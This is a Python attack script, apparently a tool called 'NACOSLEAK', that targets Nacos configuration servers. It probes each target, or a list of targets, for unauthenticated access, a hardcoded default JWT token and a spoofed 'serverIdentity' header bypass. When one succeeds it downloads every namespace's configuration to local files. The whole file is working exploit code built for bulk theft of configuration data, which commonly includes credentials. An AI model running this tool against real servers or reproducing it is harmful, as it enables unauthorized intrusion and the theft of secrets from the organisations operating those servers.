import os
import requests
import json
import argparse
from urllib.parse import urlparse

def print_banner():
    banner = """
  _   _    _    ____ ___  ____  _     _____    _    _  __
 | \\ | |  / \\  / ___/ _ \\/ ___|| |   | ____|  / \\  | |/ /
 |  \\| | / _ \\| |  | | | \\___ \\| |   |  _|   / _ \\ | ' / 
 | |\\  |/ ___ \\ |__| |_| |___) | |___| |___ / ___ \\| . \\ 
 |_| \\_/_/   \\_\\____\\___/|____/|_____|_____/_/   \\_\\_|\\_\\
                                            By:white v1.0
    """
    print(banner)

def initial_url_check(target,timeout):
    url = f"{target}/nacos/v1/console/server/state"
    session = requests.Session()
    try:
        response = session.get(url, timeout=timeout)
        if response.status_code == 404:
            print(f"[-]{target} 404")
            return False
        elif response.status_code == 200:
            return True
    except requests.exceptions.Timeout:
        print(f"[-]{target} timeout")
        return False
    except requests.exceptions.RequestException as e:
        print(f"Error: Initial /nacos endpoint request failed for {base_url}: {e}")
        return False
    return False

class NacosAuthChecker:
    def __init__(self, base_url, proxy, timeout=3):
        self.base_url = base_url
        self.session = requests.Session()
        self.proxies = {"http": proxy, "https": proxy}
        self.token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTAwMDAwMDAwMDAwMDAwMDAwfQ.yL4GVAIpCGu0Y7Mpq7k4RfVML_nTHBbivofzfPs98XY"
        self.username = "nacos"
        self.headers = ""
        self.timeout = timeout

    def check_unauthorized_access(self):
        url = f"{self.base_url}/nacos/v1/auth/users?pageNo=1&pageSize=100&search=accurate"
        try:
            response = self.session.get(url, proxies=self.proxies, timeout=self.timeout)
            if response.status_code == 200:
                return True
        except requests.exceptions.Timeout:
            print(f"Unauthorized access check request timed out for {self.base_url}.")
        except requests.exceptions.RequestException as e:
            print(f"Unauthorized access check request failed for {self.base_url}: {e}")
        return False

    def check_default_jwt_token(self):
        url = f"{self.base_url}/nacos/v1/auth/users?pageNo=1&pageSize=100&search=accurate&accessToken={self.token}"
        self.headers = {"Authorization": self.token}
        try:
            response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
            if response.status_code == 200:
                return True
        except requests.exceptions.Timeout:
            print(f"Default JWT token check request timed out for {self.base_url}.")
        except requests.exceptions.RequestException as e:
            print(f"Default JWT token check request failed for {self.base_url}: {e}")
        return False

    def check_server_identity_bypass(self):
        url = f"{self.base_url}/nacos/v1/auth/users?pageNo=1&pageSize=100&accessToken=&search=accurate"
        self.headers = {"serverIdentity": "security"}
        try:
            response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
            if response.status_code == 200:
                return True
        except requests.exceptions.Timeout:
            print(f"Server identity bypass check request timed out for {self.base_url}.")
        except requests.exceptions.RequestException as e:
            print(f"Server identity bypass check request failed for {self.base_url}: {e}")
        return False

    def run(self):
        if self.check_unauthorized_access():
            return "unauthorized_access"
        elif self.check_default_jwt_token():
            return "default_jwt"
        elif self.check_server_identity_bypass():
            return "server_identity_bypass"
        return None


class NacosConfigExporter:
    def __init__(self, base_url, session, proxies, token, username, headers, timeout=3):
        self.base_url = base_url
        self.session = session
        self.proxies = proxies
        self.token = token
        self.username = username
        self.headers = headers
        self.timeout = timeout

    def get_all_namespaces(self):
        url = f"{self.base_url}/nacos/v1/console/namespaces"
        try:
            response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
            if response.status_code == 200:
                namespaces = response.json().get('data', [])
                return namespaces
            else:
                print(f"获取 namespaces 失败 for {self.base_url}")
        except requests.exceptions.Timeout:
            print(f"获取 namespaces 请求超时 for {self.base_url}")
        except requests.exceptions.RequestException as e:
            print(f"获取 namespaces 请求失败 for {self.base_url}: {e}")
        return []

    def export_all_configs(self):
        namespaces = self.get_all_namespaces()

        base_url_host = "./results/"+urlparse(self.base_url).netloc.replace(":", "_")
        os.makedirs(base_url_host, exist_ok=True)
        
        for namespace in namespaces:
            namespace_dir = os.path.join(base_url_host, namespace['namespaceShowName'])
            os.makedirs(namespace_dir, exist_ok=True)

            url = (f"{self.base_url}/nacos/v1/cs/configs?pageNo=1&pageSize=100"
                   f"&search=accurate&dataId=&group=&tenant={namespace['namespace']}&accessToken={self.token}&username={self.username}")
            try:
                response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
                if response.status_code == 200:
                    configs = response.json().get('pageItems', [])
                    for config in configs:
                        content = config.get("content", "")
                        if content:
                            file_path = os.path.join(namespace_dir, f"{config['dataId']}.txt")
                            with open(file_path, "w", encoding="utf-8") as f:
                                f.write(content)
                else:
                    print(f"导出 namespace {namespace['namespace']} 的配置失败 for {self.base_url}")
            except requests.exceptions.Timeout:
                print(f"导出 namespace {namespace['namespace']} 的配置请求超时 for {self.base_url}")
            except requests.exceptions.RequestException as e:
                print(f"导出 namespace {namespace['namespace']} 的配置请求失败 for {self.base_url}: {e}")
        
        print(f"[+]Save to {os.path.abspath(base_url_host)}")


def process_base_url(base_url, proxy, timeout):
    if base_url[-len(base_url):] == '/':
        base_url = base_url[:-1]
    if initial_url_check(base_url,timeout):
        # 获取权限
        auth_checker = NacosAuthChecker(base_url, proxy, timeout)
        auth_result = auth_checker.run()
        if auth_result:
            print(f"[+]{base_url} Found Vuln {auth_result}")
            # 导出配置
            if auth_result == "unauthorized_access":
                config_exporter = NacosConfigExporter(base_url, auth_checker.session, auth_checker.proxies, "", auth_checker.username, "", timeout)
            elif auth_result == "default_jwt":
                config_exporter = NacosConfigExporter(base_url, auth_checker.session, auth_checker.proxies, auth_checker.token, auth_checker.username, auth_checker.headers, timeout)
            elif auth_result == "server_identity_bypass":
                config_exporter = NacosConfigExporter(base_url, auth_checker.session, auth_checker.proxies, auth_checker.token, auth_checker.username, auth_checker.headers, timeout)
            config_exporter.export_all_configs()
        else:
            print(f"{base_url} Not Found Vuln")
    else:
        pass


if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser(description="Nacos Config Exporter")
    parser.add_argument("-t","--target", help="Base URL of the Nacos server")
    parser.add_argument("-f", "--file", help="File containing list of base URLs")
    parser.add_argument("--proxy", help="Proxy server (eg: http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=3, help="Request timeout in seconds (default: 3)")
    args = parser.parse_args()
    
    proxy = args.proxy
    timeout = args.timeout

    if args.file:
        with open(args.file, "r") as file:
            base_urls = [line.strip() for line in file if line.strip()]
        for base_url in base_urls:
            try:
                process_base_url(base_url, proxy, timeout)
            except Exception as e:
                print(f"Error processing {base_url}: {e}")
            print("\n")
    elif args.target:
        try:
            process_base_url(args.target, proxy, timeout)
        except Exception as e:
            print(f"Error processing {args.target}: {e}")
        print("\n")
    else:
        print("Error: You must specify either a base URL or a file containing base URLs.")
